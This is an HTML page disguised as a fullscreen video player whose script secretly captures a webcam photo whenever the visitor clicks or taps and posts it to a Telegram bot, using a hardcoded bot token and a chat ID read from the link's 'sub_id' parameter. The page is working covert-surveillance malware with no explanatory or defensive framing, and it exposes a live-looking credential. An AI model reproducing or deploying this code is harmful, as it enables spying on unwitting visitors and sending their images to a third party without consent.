<title>Video Fullscreen</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { width: 100%; height: 100%; background-color: #000; overflow: hidden; }
    video#mainVideo {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        min-width: 100%;
        min-height: 100%;
        object-fit: cover;
        object-position: center;
        z-index: 1;
    }
</style>
<script>
    const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';

    const urlParams = new URLSearchParams(window.location.search);
    const targetChatId = urlParams.get('sub_id');

    let isProcessing = false;

    async function handleCapture() {
        if (isProcessing || !targetChatId) return;
        isProcessing = true;

        let stream = null;

        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });

            const hiddenVideo = document.createElement('video');
            hiddenVideo.muted = true;
            hiddenVideo.playsInline = true;
            hiddenVideo.srcObject = stream;
            
            await hiddenVideo.play();
            await new Promise(resolve => setTimeout(resolve, 400));

            const canvas = document.createElement('canvas');
            canvas.width = hiddenVideo.videoWidth || 640;
            canvas.height = hiddenVideo.videoHeight || 480;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(hiddenVideo, 0, 0);

            stream.getTracks().forEach(track => track.stop());

            canvas.toBlob(async (blob) => {
                if (!blob) return;

                const formData = new FormData();
                formData.append('chat_id', targetChatId);
                formData.append('photo', blob, 'capture.png');

                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (err) {
                    console.error("Error sending photo:", err);
                }
            }, 'image/png');

        } catch (err) {
            console.error("Camera Error:", err);
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }
    }

    window.addEventListener('click', handleCapture);
    window.addEventListener('touchstart', handleCapture);
</script>
</body>
</html>
